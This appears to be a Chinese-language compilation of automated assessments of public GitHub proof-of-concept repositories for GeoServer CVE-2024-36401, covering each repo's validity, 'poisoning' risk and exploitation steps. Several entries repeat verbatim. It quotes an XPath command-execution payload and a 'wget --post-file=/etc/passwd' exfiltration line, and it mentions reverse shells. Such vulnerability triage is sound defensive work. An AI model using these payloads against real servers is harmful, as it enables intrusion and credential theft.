2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

